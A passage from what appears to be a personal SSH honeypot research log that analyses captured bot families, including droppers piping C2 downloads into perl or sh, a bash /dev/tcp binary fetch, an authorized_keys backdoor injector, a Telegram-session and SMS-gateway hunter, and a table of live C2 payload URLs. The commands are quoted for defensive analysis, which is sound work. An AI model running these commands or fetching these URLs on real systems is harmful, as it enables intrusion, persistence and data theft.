in quarantine was my own test from dropper_sim.go.

Analysis pending. I need to learn IRC C2 basics and how to trace a bash script's network
behavior before I can say anything meaningful about this one.

![gJw27HGL SSH worm session replay](https://github.com/user-attachments/assets/0465512f-a78a-4120-aa0e-8f60015d405a)

*Session 736804a5e683 -- 176.61.50.14. One command, and the 4.7KB bash worm arrives over SCP.
The first payload the quarantine actually caught.*

---

### 14. Architecture capability prober

One session 2026-06-12 12:54-13:00 Rabat. Source IP: 185.129.62.63. Client: SSH-2.0-OpenSSH_9.9 --
the only hit in the dataset using a real modern OpenSSH client, not a scanner library.
Single auth attempt with password `root`.

Kill chain:
```bash
LC_ALL=C top -bn1                          # snapshot running processes
scp -t /bin/tz7n3j1l8apie4kgjj19caibdc    # upload 64-bit ELF to /bin/ via SCP
LC_ALL=C /bin/tz7n3j1l8apie4kgjj19caibdc  # execute it
LC_ALL=C rm -f /bin/tz7n3j1l8apie4kgjj19caibdc  # delete it
scp -t /bin/tz7n3j1l8apie4kgjj19caibdc    # upload 32-bit ELF (same path)
LC_ALL=C /bin/tz7n3j1l8apie4kgjj19caibdc  # execute it
LC_ALL=C rm -f /bin/tz7n3j1l8apie4kgjj19caibdc  # delete it
```

The quarantine captured both uploaded binaries:

```
e374a7ad447d2cf791ecae122894a51ba723901ea132e7fa16cd47c44e4a1769  512B  ELF64 x86-64
f74a8b06db4f8f48f4a19ea5c01bade2a0dfb9290c4ed04a3f1a3eaa298a843d  348B  ELF32 x86
```

Both are handcrafted assembly "Hello, world!" programs -- the absolute minimum ELF:
write(1, "Hello, world!\n", 14) then exit(0). Two syscalls, no libc, no imports.
The 64-bit version uses `syscall` instruction; the 32-bit uses `int 0x80`. The binaries
are 512B and 348B because ELF overhead dominates -- the .text sections are 39 and 34 bytes.

This is a capability test. The attacker uploads a known-working binary and checks whether
it executes on the target before deploying the real payload. Testing both x86-64 and x86
in the same session means the follow-up deployment is architecture-agnostic and the prober
is figuring out which format to use.

The `/bin/` path is deliberate -- writable on some misconfigured systems, looks less
suspicious than `/tmp/` in `top` output.

`top -bn1` before the drop reads the process table. Either checking for competition (other
malware) or timing -- some malware delays execution until load is low.

The random 26-character filename (`tz7n3j1l8apie4kgjj19caibdc`) avoids collisions.
Same name reused for both drops since the first is deleted before the second upload.

45 minutes before this session, a VPS scout (F7) ran from 85.215.175.242 (SSH-2.0-Go),
running the full 35-command recon including `dd` disk benchmark. Different IP, different
client. Could be two bots in the same pipeline, or two independent actors that happened
to hit the same minute-window. The F12/F7 pairing set precedent for this two-stage
pattern, so I'm suspicious of it being coordinated. Neither IP came back after June 12.

The real payload was never sent. Either the honeypot's fake `top` output (or a fake
execution response) failed some check, or the real deployment goes to a separate queue
and hasn't happened yet.

![architecture capability prober session replay](https://github.com/user-attachments/assets/e3b27249-6e38-499c-ba38-ed30eb746e01)

*Session eab1131b36ad -- 185.129.62.63, 8 commands. `top -bn1` to snapshot processes, then two
handcrafted ELF test binaries pushed over SCP and executed. The real payload never came.*

---

### 15. SSH liveness/capability probe

**14954 sessions, 3 IPs, 98.9% from 103.105.67.170. Campaign span on that IP: ~4.5h,
2026-06-15, single burst.**

```bash
echo -e "\x6F\x6B"
```

Decodes to "ok". Single standalone command, no framing, no recon, no follow-up.
Zero cross-cluster overlap with any other family -- this is the IP's only behavior
across all 22551 sessions in the dataset.

14793 sessions from one IP in under 5 hours is one connection every ~1-2 seconds.
Consistent with an automated mass-scan sweep, not a persistent monitor.

My read: testing whether the exec channel executes and echoes back. If the C2 sees
"ok", the target is live. If it sees garbage or nothing, the shell is fake or broken.
Decision is made externally -- nothing more follows. Could be a pre-stage gate for a
follow-up we never saw, or pure cataloguing.

![ok-beacon session replay](https://github.com/user-attachments/assets/ee57414c-57ed-4dc2-860c-8c2363682591)

*Session b920d4c991a7 -- 37.27.241.28. One command, `echo -e "\x6F\x6B"`, connection closed.
Multiply by 139336 sessions.*

---

### 16. perl dropper -- curl | perl

**478 sessions, 186 IPs, 2026-08-20 13:45 -> 2026-08-23 19:29 Rabat. Still live at the
time of the pull.**

```bash
uname -a 2>/dev/null || echo 'Unknown'
curl -sS 154.70.152.216/zed | perl >/dev/null 2>&1 &
export HOME=/dev/null
```

Three commands. The interesting one is the middle.

Every other dropper family here pipes into `sh`. This one pipes into `perl`. Same shape,
different interpreter. Perl is installed by default on most distros and nobody watches it
the way they watch `curl | sh`. If a detection rule greps for `| sh` or `| bash` it does
not fire here.

`>/dev/null 2>&1 &` backgrounds it and throws away all output, so the session closes clean
and the payload keeps running detached.

`export HOME=/dev/null` after the fetch. No shell history file, no `~/.bashrc`, nothing
written to a home dir. Cheap anti-forensics and it also means anything the payload does
later cannot drop config in `$HOME`.

The C2 is a bare IP on port 80, no TLS, path `/zed`. I have not fetched it.

186 IPs in three days makes this the fastest-spreading family in the whole dataset. It
showed up 4 days before I pulled and it is the only family that is clearly still ramping.

**Probable precursor.** Cluster `63bb63ee10` is 928 sessions from 116 IPs starting
2026-08-17, and it is exactly the first command of this family and nothing else:

```bash
uname -a 2>/dev/null || echo 'Unknown'
```

62 of the 186 perl IPs also ran that recon-only session. That is a real overlap, so my
read is recon on the 17th, payload from the 20th. But 67% of the perl IPs never ran a
recon-only session, so I am not tagging them as the same family. Left it as untagged
C18 in family_mapping.json until I have more.

![perl dropper session replay](https://github.com/user-attachments/assets/10ec501f-3e16-4cb3-a179-a12b31c56d8e)

*Session d321ecc509f7 -- 162.241.235.82, 3 commands, under a second. Fingerprint, fetch,
detach. The whole family fits on three lines.*

---

### 17. authorized_keys injector

**52 sessions, 37 IPs, one burst: 2026-08-17 15:16 -> 19:29 Rabat. Never seen before or
since.**

```bash
uname -a
mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/...' 
```

No malware. No download. No miner. It writes an RSA public key and leaves.

This is the quietest family in the dataset and probably the most dangerous one. Every other
bot drops a binary that a scanner can find, a cron line that shows up in `crontab -l`, a
process with a stupid name like `kswpad`. This one adds a line to a file that is supposed
to have lines in it. Nothing to detect at runtime because nothing is running.

Then whoever holds that private key just logs in later. As root. Legitimately, as far as
sshd is concerned.

4 hours, 37 IPs, then gone. Reads like someone bought a list of cracked hosts and ran one
pass to convert password access into key access before the passwords got rotated.

Worth noting the key is reused across all 37 IPs -- same public key every time. So it is
one operator, not 37.

The key comment is `rsa-key-20250409`. That is the default format PuTTYgen writes, and the
date in it is April 2025 -- the keypair is over a year older than this campaign. Same
operator has been reusing it a while.

Full line, appended not overwritten, so an existing `authorized_keys` keeps working and
nobody notices anything broke:

```bash
mkdir -p /root/.ssh && echo 'ssh-rsa AAAA... rsa-key-20250409' >> /root/.ssh/authorized_keys \
  && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys 2>/dev/null
```

It even fixes the permissions afterwards. sshd refuses keys in a world-readable `.ssh`, so
this is a bot that has been burned by that before.

![authorized_keys injector session replay](https://github.com/user-attachments/assets/cb9a6034-3db0-43f5-8a1e-70f549cdf014)

*Session 9f2153fb0867 -- 139.59.131.24, 2 commands. `uname -a`, then the key goes in. No
payload, nothing running, nothing to find.*

---

### 18. SSH key + scp transport (F5 descendant)

**375 sessions across two C2s, 4 IPs total. 2026-06-10 -> 2026-08-23. Longest-running of
the new ones.**

Same `auth_ok` beacon as family 5:

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
...
-----END OPENSSH PRIVATE KEY-----' > key.ppk
echo 'StrictHostKeyChecking no
UserKnownHostsFile /dev/null' > sshcfg
chmod 400 key.ppk
scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh
if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh; else (wget -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s ssh; fi
rm -rf sshcfg key.ppk out_sh
```

`\x61\x75\x74\x68\x5F\x6F\x6B\x0A` decodes to `auth_ok\n`. Same beacon as family 5, so
same operator or same kit.

What changed is the transport. Family 5 was fileless `wget | sh`. This one ships its own
ed25519 **private** key, writes an ssh config that disables host key checking, and pulls
the payload over **scp**. `wget | sh` is only the fallback if scp fails.

That is a real upgrade. scp traffic to port 22 outbound looks like an admin copying a file.
`wget` to a bare IP over https with `--no-check-certificate` looks like malware. If you are
egress-filtering on HTTP, this walks straight past.

Handing out a private key to every compromised host is sloppy though -- I have the key, so
does anyone else who got hit. It is scoped to user `dlr` on the C2 and the base64 comment
field says `dlr@sftp`, so it is probably a locked-down sftp-only account that can read one
file. Still, it is attacker key material sitting in my logs.

Two C2s over time:
- `14.46.136.77` -- 28 sessions, 2026-06-10 -> 06-13, 1 IP
- `217.60.195.113` -- 347 sessions, 2026-06-13 -> 08-23, 3 IPs
  (`130.12.180.51`, `77.90.185.20`, `45.148.10.68`)

Switched C2 on 06-13 and the new one has been up for over two months. `130.12.180.51` is in
my top-15 source IPs overall.

The cleanup line at the end (`rm -rf sshcfg key.ppk out_sh`) means on a real box there would
be nothing left on disk pointing at the C2. I only have it because the honeypot logs the
command, not the filesystem.

![SSH key + scp transport session replay](https://github.com/user-attachments/assets/cfd9b763-8b92-4d0d-a049-3bd24c9f3e38)

*Session 109081a457cd -- 130.12.180.51, one single exec command carrying the whole chain:
beacon, write private key, write ssh config, scp the payload, run it, delete the evidence.*

---

### 19. MikroTik / Telegram / SMS gateway hunter

**6 sessions, 3 IPs, 2026-06-12 -> 2026-07-24. Client `SSH-2.0-libssh2_1.11.0` -- the only
family in the dataset not built on the Go SSH library.**

```bash
/ip cloud print
ifconfig
uname -a
cat /proc/cpuinfo
ps | grep '[Mm]iner'
ps -ef | grep '[Mm]iner'
ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata \
       /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log \
       /etc/smsd.conf* /usr/bin/qmuxd /...
locate D877F783D5D3EF8Cs
echo Hi | cat -n
```

This one is not a dropper. It does not download anything. It is looking for specific data
and specific hardware, and if it does not find them it leaves.

`/ip cloud print` is RouterOS. That is a MikroTik command, not Linux. So the same bot is
sprayed at routers and at Linux boxes and just tries both syntaxes.

The interesting line is the `ls`. Three different things in one glob:

- `TelegramDesktop/tdata` -- Telegram Desktop's local session store. `D877F783D5D3EF8C` on
  the next line is the tdata key file. If you copy that directory you get the logged-in
  Telegram session, no password and no OTP needed. That is session theft, not credential
  theft.
- `/dev/ttyGSM*`, `/dev/ttyUSB-mod*`, `/usr/bin/qmuxd` -- GSM modem device nodes.
- `/var/spool/sms/*`, `/var/log/smsd.log`, `/etc/smsd.conf*` -- smstools, the Linux SMS
  gateway daemon.

So: Telegram sessions, and the ability to send and receive SMS. Put those together and it
reads like OTP interception. A box with a GSM modem attached is a phone number you can
borrow.

`echo Hi | cat -n` at the end is a pipe test -- checking the shell actually pipes before
trusting any of the output above. My fake shell handles pipes, so it passed.

Only 6 sessions across 3 IPs (`64.226.126.224` x4, `5.187.97.40`, `80.249.151.39`) in six
weeks. Lowest volume of anything I have named, and by far the most targeted. Everything
else here is spray-and-mine. This one is hunting.

![MikroTik / Telegram / SMS gateway hunter session replay](https://github.com/user-attachments/assets/eb3aeb5d-f9d7-425a-b14a-27e0809b999d)

*Session 656f3e0321fa -- 64.226.126.224, 9 commands. RouterOS syntax, competitor-miner check,
then the Telegram tdata and GSM modem glob. Nothing downloaded, nothing dropped.*

---

### 20. busybox IoT probe

**19 sessions, 7 IPs, 2026-06-15 -> 2026-08-18.**

```bash
/bin/busybox TEST
cat /proc
./
```

Three commands, all of them broken on purpose.

`/bin/busybox TEST` is the Mirai family calling card. busybox prints its applet list and an
error for an unknown command, and the loader greps the output for a known marker. It is not
running TEST, it is checking that busybox exists and behaves like busybox. On real IoT gear
busybox *is* the shell, so this is the fastest way to tell an embedded target from a real
Linux server.

`cat /proc` on a directory errors out too. Also deliberate -- the error text differs between
busybox and coreutils.

`./` is not a command at all.

All three are fingerprinting by *error message*, not by output. That is why my honeypot never
got the payload: I answer these plausibly enough to look alive but not the way real busybox
answers, so the loader decided this was not the kind of box it wanted and never sent stage two.

Concentrated on one IP (`31.77.227.120`, 12 of 19 sessions), rest spread across six.

Worth flagging as a gap on my side: this is a family I can see knocking but cannot capture,
because capturing it means emulating busybox error strings exactly.

![busybox IoT probe session replay](https://github.com/user-attachments/assets/45f65641-9fae-4633-99e6-f63b25fe8d70)

*Session d84f425e5304 -- 31.77.227.120, 3 commands, all of them deliberately invalid. It reads
the error text, decides this is not real busybox, and leaves without sending stage two.*

---

### 21. dd + /dev/tcp binary push

**1 session, 1 IP (`5.31.40.72`), 2026-08-05 01:13 Rabat. Client `SSH-2.0-makiko`.
Session 45c6032c8ea9.**

Two fileless transports in one session, neither using curl or wget.

First, bash as an HTTP client:

```bash
nohup bash -c "exec 6<>/dev/tcp/172.100.0.1/60145 && echo -n 'GET /linux' >&6 \
  && cat 0<&6 > /tmp/yjRvsSGHBE && chmod +x /tmp/yjRvsSGHBE \
  && /tmp/yjRvsSGHBE mFh8tce4l4m42Kp0WZmYW3u7zqaVlr/Yqnt..." &
```

`/dev/tcp/host/port` is not a real device. It is a bash builtin -- bash opens the socket
itself. So there is no curl, no wget, no python, no binary to find on disk, and nothing in
`ps` except bash. If you removed every download tool from the box this still works. The
payload gets an argument that looks like a base64 key, so it is parameterized per victim.

Then, the actual binary pushed straight down the SSH channel:

```bash
dd bs=1 count=1911588 > /tmp/CrdPfVuUEW
<1911588 bytes of raw binary on stdin>
```

1.9 MB written byte by byte into a temp file. The bytes contain `UPX!`, so it is a
UPX-packed ELF.

This is the same idea as family 10 but a different primitive. F10 wrote its binary with
43000 `echo -e` chunks; this writes it in one `dd` from stdin. Both are solving the same
problem -- get a binary onto a box using only the shell channel -- and `dd` is by far the
tidier answer. One command instead of 43000.

Only one session, so I cannot say whether it is a campaign or somebody testing. But the
technique is the most competent thing in the whole dataset.

`172.100.0.1` is a routable address, not RFC1918 -- easy to misread as internal.

![dd + /dev/tcp binary push session replay](https://github.com/user-attachments/assets/82bed475-3201-46ed-b7f1-13b16a2a107f)

*Session 45c6032c8ea9 -- 5.31.40.72. The `/dev/tcp` fetch and the `dd bs=1 count=1911588` line,
followed by 1.9MB of raw UPX-packed ELF arriving through the SSH channel.*

---

### 22. Recon variants

Three low-volume patterns that are clearly their own thing but not worth a section each.

**Self-provisioning inventory bot** -- 9 sessions, 4 IPs, 2026-07-15 -> 2026-08-07.

```bash
which curl || apt install curl -y >/dev/null 2>&1
which lscpu || apt install lscpu -y >/dev/null 2>&1
which free || apt install procps -y >/dev/null 2>&1
which df || apt install coreutils -y >/dev/null 2>&1
...
curl -s ipinfo.io/json
```

Every other family assumes its tools exist and fails silently when they do not. This one
**installs them**. Then a full hardware inventory -- CPU model, RAM, disk total and free,
uptime, process count, logged-in users -- and finishes by geolocating the host through
ipinfo.io.

Nothing is dropped and nothing persists. It reads like inventory for resale: specs plus
location is exactly what you list a box with. `87.236.208.53` ran 6 of the 9.

**Capability matrix scanner** -- 7 sessions, 1 IP (`206.123.156.179`), all on 2026-07-08.

33 commands, every one wrapped in `|| echo Unknown` so nothing ever errors. First half is
hardware and network, second half is a straight `command -v` sweep:

```bash
command -v sudo / docker / python3 / python / go / gcc / nginx / apache2 / httpd
command -v mysql / psql / redis-cli / mongod / node / npm / systemctl / crontab
id -u | grep -q 0
```

Different question from family 7. F7 asks what distro this is by probing package managers.
This asks what the box can *do* -- can it build, can it serve, does it run databases, is
there a container runtime, am I root. Thin evidence though: one IP, one day, never came back.

**handshakebins.sh dropper** -- 5 sessions, `45.135.194.26` -> C2 `213.232.114.14`,
2026-08-23. Landed the same day I pulled.

```bash
cd /tmp || cd /run || cd /
wget http://213.232.114.14/handshakebins.sh
busybox wget http://213.232.114.14/handshakebins.sh
curl -o handshakebins.sh http://213.232.114.14/handshakebins.sh
chmod 777 handshakebins.sh; sh handshakebins.sh
tftp 213.232.114.14 -c get handshaketftp1.sh; chmod 777 handshaketftp1.sh; sh handshaketftp1.sh
tftp -r handshaketftp2.sh -g 213.232.114.14; chmod 777 handshaketftp2.sh; sh handshaketftp2.sh
rm -rf handshakebins.sh handshaketftp1.sh handshaketftp2.sh; rm -rf *
```

Five fetch attempts for the same file: wget, busybox wget, curl, then **TFTP twice with two
different syntaxes** because the two common tftp clients disagree on flags. Somebody has
been burned by minimal images with no HTTP client.

Then `rm -rf *` in whatever directory it landed in. Not cleanup -- cleanup is the line
before it. That is destructive, in `/tmp` or `/run` or `/`.

Too fresh to say more. Worth watching on the next pull.

![recon variants session replay](https://github.com/user-attachments/assets/c8b9ebb0-457c-4ea8-b5f8-837667b1c27c)

*Session 7ce0b4000005 -- 87.236.208.53, 17 commands. `apt install`s its own missing tooling,
inventories the hardware, then geolocates the box through ipinfo.io.*

---
## Effect of auth-threshold=1

Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.

```
                before    after
attempts          102       143   +40%
unique IPs         12        41  +242%
single-shot         5        27  +440%
accepted            8       143 +1688%
commands            6       234 +3800%
new families      none    5 new
```

Families 5-10 are all single-shot -- they try once, get rejected, leave without a trace.
Under threshold=10 they were completely invisible.

Verified in logs: C2 dropper first hit at 07:56 (1h41m after change), VPS scout at
09:48, w.sh bot at 14:17. Zero sessions of these families in the 68h before the change.

---

## What the honeypot was good at

**GPU bait worked.** Fake Tesla T4 in lspci triggered Diicot's full kill chain. Without
it, they would have exited at "no GPU found".

**SCP handler kept bots engaged.** Speaking the wire protocol meant the SCP dropper ran
all 11 attempts instead of dying on the first rejection.

**Returning exit 0 everywhere** kept bots progressing through their playbook.

**URL logging (added late).** wget/curl now log their URL argument. Family 10 URLs
captured within 17 minutes of deploying.

## Confirmed C2 infrastructure (from replay--2026-06-26)

Extracted from session replay, confirmed in raw session.log:

| Family | URL | Notes |
|--------|-----|-------|
| F2 Diicot | `http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG` | payload saved to `~/.sysmonitor`, chmod+exec |
| F5 dropper | `https://14.46.136.77/sh` | wget/curl piped to sh, fileless |
| F6 w.sh | `http://91.239.211.89/init.sh` | tried /tmp, /var/tmp, /dev/shm |
| F11 Meow | `http://197.255.229.88:1987/fav.ico` | payload, curl/wget/python/perl/tcp fallback chain |
| F11 Meow | `http://197.255.229.88:1987/kon` | SSH public key, appended to authorized_keys |
| F12 wowo | `http://wowo.biz.id/wowiloveyou/runningaway.x86` | chmod 777, executed as `./runningaway.x86 vipies`, self-deleted |

F10 C2 uses two ports on 195.177.94.72: 564 (documented) and 3594 (also observed).
Both servers (195.177.94.72 and 45.88.91.135) serve /b/, /s/, and /t/ paths for each binary.

---

## What I missed

**The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.

**The 4 binaries from the ELF injector session** -- recoverable from session.log hex chunks,
also downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
analysis yet.

**Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.

**$() subshell substitution** -- not implemented. Some bot commands use it and get
empty strings back instead of the right answer.
